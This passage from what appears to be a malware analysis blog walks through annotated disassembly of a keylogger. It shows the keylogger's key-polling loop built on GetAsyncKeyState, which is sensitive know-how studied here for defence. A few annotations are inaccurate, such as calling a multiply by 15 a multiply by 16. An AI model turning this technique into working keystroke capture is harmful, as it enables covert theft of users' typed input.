&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A4E3&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;var_10&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;edx&lt;/span&gt;    &lt;span style=&#34;color: #586E75&#34;&gt;; var_10 = size of array of type size_t&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A4E6&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;edx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;var_10&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A4E9&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;imul&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;edx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0Fh&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A4EC&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;edx&lt;/span&gt;             &lt;span style=&#34;color: #586E75&#34;&gt;; size_t&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A4ED&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;_malloc&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A4F2&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;add&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;esp&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;4&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A4F5&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;var_C&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt; &lt;span style=&#34;color: #586E75&#34;&gt;; pointer to allocated memory&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A4F8&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;var_10&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;    &lt;span style=&#34;color: #586E75&#34;&gt;; eax = size of array&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A4FB&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;imul&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0Fh&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A4FE&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;             &lt;span style=&#34;color: #586E75&#34;&gt;; size_t&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A4FF&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;               &lt;span style=&#34;color: #586E75&#34;&gt;; int&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A501&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;ecx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;var_C&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A504&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;ecx&lt;/span&gt;             &lt;span style=&#34;color: #586E75&#34;&gt;; void *&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A505&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;_memset&lt;/span&gt;         &lt;span style=&#34;color: #586E75&#34;&gt;; Initialize array with 0&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A50A&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;add&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;esp&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0Ch&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A50D&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color: #2AA198&#34;&gt;0Ah&lt;/span&gt;             &lt;span style=&#34;color: #586E75&#34;&gt;; dwMilliseconds&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A50F&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;ds&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;Sleep&lt;/span&gt;        &lt;span style=&#34;color: #586E75&#34;&gt;; Sleep for 10 miliseconds&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A515&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;xor&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;edx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;edx&lt;/span&gt;        &lt;span style=&#34;color: #586E75&#34;&gt;; edx = 0&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A517&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;var_8&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;dx&lt;/span&gt; &lt;span style=&#34;color: #586E75&#34;&gt;; var_8 = 0&lt;/span&gt;

&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A51B&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;loc_1000A51B&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A51B&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;movsx&lt;/span&gt;   &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;var_8&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;   &lt;span style=&#34;color: #586E75&#34;&gt;; eax = 0&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A51F&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;cmp&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;var_10&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;  &lt;span style=&#34;color: #586E75&#34;&gt;; if (0 =&amp;gt; size of array) &lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A522&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;jge&lt;/span&gt;     &lt;span style=&#34;color: #268BD2&#34;&gt;short&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;loc_1000A554&lt;/span&gt; &lt;span style=&#34;color: #586E75&#34;&gt;; if (no memory was allocated) - jump to loc_1000A554&lt;/span&gt;

&lt;span style=&#34;color: #586E75&#34;&gt;; if memory was allocated&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A524&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color: #2AA198&#34;&gt;0Ah&lt;/span&gt;             &lt;span style=&#34;color: #586E75&#34;&gt;; dwMilliseconds&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A526&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;ds&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;Sleep&lt;/span&gt;        &lt;span style=&#34;color: #586E75&#34;&gt;; Sleep for 10 miliseconds&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A52C&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_10009EB0&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A531&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;var_14&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;    &lt;span style=&#34;color: #586E75&#34;&gt;; var_14 = sub_10009EB0()&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A534&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;cmp&lt;/span&gt;     &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;var_14&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A538&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;jz&lt;/span&gt;      &lt;span style=&#34;color: #268BD2&#34;&gt;short&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;loc_1000A55&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;Line 1 calls &lt;code&gt;rand&lt;/code&gt; and the result is modified a few times by doing some calculations in lines 3-8. In line 9, it is pushed to stack as argument for &lt;code&gt;malloc&lt;/code&gt;. So a random number of bytes are allocated. Seems like it is allocating an array of type &lt;code&gt;size_t&lt;/code&gt;. This is reinforced because the number is multiplied by 16 (size of size_t) in line 8 before being pushed to the stack. After the &lt;code&gt;malloc&lt;/code&gt;, the pointer to the allocated memory is stored in &lt;code&gt;var_C&lt;/code&gt;. In lines 13-19 we see that this array is reset to zero by &lt;code&gt;memset&lt;/code&gt;. Line 22 calls sleep with 10 miliseconds. Last line compares the calculated size of array with 0 and if so then no memory was allocated and program jumps back to the start of the function and tries to allocate memory and initialize memory again. If memory was allocated we continue to line 32 sleep for 10 miliseconds and call &lt;code&gt;sub_10009EB0&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;sub_10009EB0&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:10009&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;EB0&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;sub_10009EB0&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;proc&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;near&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:10009&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;EB0&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:10009&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;EB0&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;var_8&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #DC322F&#34;&gt;dword&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;ptr&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;8&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:10009&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;EB0&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;var_4&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #DC322F&#34;&gt;word&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;ptr&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;4&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:10009&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;EB0&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:10009&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;EB0&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:10009&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;EB1&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;esp&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:10009&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;EB3&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;sub&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;esp&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;8&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:10009&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;EB6&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;8&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:10009&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;EBB&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;var_4&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;ax&lt;/span&gt;   &lt;span style=&#34;color: #586E75&#34;&gt;; var_4 = 0&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:10009&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;EBF&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;jmp&lt;/span&gt;     &lt;span style=&#34;color: #268BD2&#34;&gt;short&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;loc_10009ECD&lt;/span&gt;

&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:10009&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;ECD&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;loc_10009ECD&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:10009&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;ECD&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;movsx&lt;/span&gt;   &lt;span style=&#34;color: #B58900&#34;&gt;edx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;var_4&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:10009&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;ED1&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;cmp&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;edx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0DEh&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:10009&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;ED7&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;jg&lt;/span&gt;      &lt;span style=&#34;color: #268BD2&#34;&gt;loc_1000A3A4&lt;/span&gt; &lt;span style=&#34;color: #586E75&#34;&gt;; if var_4 &amp;gt; 222 (0xDE) jump to loc_1000A3A4&lt;/span&gt;

&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:10009&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;EDD&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;movsx&lt;/span&gt;   &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;var_4&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:10009&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;EE1&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;             &lt;span style=&#34;color: #586E75&#34;&gt;; vKey&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:10009&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;EE2&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;ds&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;GetAsyncKeyState&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:10009&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;EE8&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;movsx&lt;/span&gt;   &lt;span style=&#34;color: #B58900&#34;&gt;ecx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;ax&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:10009&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;EEB&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;cmp&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;ecx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0FFFF8001h&lt;/span&gt; &lt;span style=&#34;color: #586E75&#34;&gt;; check if vKey was pressed&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:10009&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;EF1&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;jnz&lt;/span&gt;     &lt;span style=&#34;color: #268BD2&#34;&gt;loc_1000A39F&lt;/span&gt;    &lt;span style=&#34;color: #586E75&#34;&gt;; jumptable 1000A2D4 default case&lt;/span&gt;

&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A39F&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;loc_1000A39F&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;           &lt;span style=&#34;color: #586E75&#34;&gt;; jumptable 1000A2D4 default case&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A39F&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;jmp&lt;/span&gt;     &lt;span style=&#34;color: #268BD2&#34;&gt;loc_10009EC1&lt;/span&gt;

&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:10009&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;EC1&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;loc_10009EC1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;
